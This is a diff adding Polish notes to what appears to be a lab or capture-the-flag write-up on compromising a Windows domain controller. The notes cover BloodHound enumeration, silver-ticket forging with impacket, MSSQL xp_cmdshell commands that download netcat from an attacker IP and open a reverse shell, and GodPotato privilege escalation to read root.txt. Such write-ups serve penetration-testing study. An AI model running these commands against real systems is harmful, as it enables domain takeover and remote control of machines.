@@ -124,3 +124,93 @@ john hash2 -w=~/SHARED/lists/rockyou.txt
 
 user nazywa się `svc_mssql`, ale nie pamiętam, żeby port 1433 był otwarty.
 
+a to nmap mnie oszukał za pierwszym :/
+
+![{BC3932F2-795B-4B13-808D-2ABF30881858}](https://github.com/user-attachments/assets/c43a3d98-c4f1-47d7-8169-e78f817e03f1)
+
+oj myślałem, że się uda od ręki.
+
+![{1A1E0EDE-A9F5-45CA-B6CB-BA229FEBB82E}](https://github.com/user-attachments/assets/46515624-2a1b-439f-aa80-9f491094beff)
+
+jestesmy na koncie guest `SQL (BREACH\svc_mssql  guest@master)`
+
+wydaje mi się, że tutaj jest rozwiąznanie
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#on-linux
+
+![{84969452-81DA-4727-9AC8-CE0997F8ADB8}](https://github.com/user-attachments/assets/a2891ee2-bbd8-49ac-9dcc-ab2cac5b97d6)
+
+to po kolei. bierzemy bloodhounda
+```
+bloodhound-python -c ALL -u svc_mssql -p '<password>' -d breach.vl -dc BREACHDC.breach.vl -ns 10.10.119.55
+```
+
+zaczynamy od domainsid
+
+![{117C2178-50C8-4385-AEAF-FDB69FF67BFB}](https://github.com/user-attachments/assets/46baeaa4-311f-4d34-8922-b4956023715c)
+
+```
+S-1-5-21-2330692793-3312915120-706255856
+```
+
+i przerabiamy hasło na hash.
+
+```
+impacket-ticketer -nthash 6996C<heeh>A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.119.55 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -k -k breachdc.breach.vl -target-ip 10.10.119.55 
+```
+
+w końcu działa
+
+![{2B49E6F7-3252-4D46-8BB5-29F09DF167D3}](https://github.com/user-attachments/assets/866d7e06-56cc-48d6-9143-56b270025928)
+
+zróbmy jakiegoś rev shella, żeby wygodniej było
+
+whoami /all
+```
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+SeMachineAccountPrivilege     Add workstations to domain                Disabled   
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+
+```
+
+w sumie wygląda jak eskalacja od ręki ziemniakiem `SeImpersonatePrivilege`.
+
+zrobię jeszcze tylko jakiegoś ludzkiego rev shella
+
+```
+xp_cmdshell mkdir C:\Temp
+xp_cmdshell dir C:\Temp
+xp_cmdshell powershell -c "curl http://10.8.4.124/nc64.exe -o C:\Temp\nc.exe"
+xp_cmdshell C:\Temp\nc.exe -e cmd 10.8.4.124 9001
+```
+
+
+ajjj plik jest usuwany
+
+co ciekawe wziąłem sobie gotowego ziemniaka i go nie wywala.
+```
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+
+xp_cmdshell powershell -c "curl http://10.8.4.124/GodPotato-NET4.exe -o C:\Temp\GodPotato-NET4.exe"
+```
+
+o działa
+
+```
+xp_cmdshell C:\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
+```
+![{A46257F6-DA5C-4B8B-88BD-47976E496927}](https://github.com/user-attachments/assets/4cd31243-0371-4de6-93b1-a9a8911454e0)
+
+```
+xp_cmdshell C:\Temp\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+```
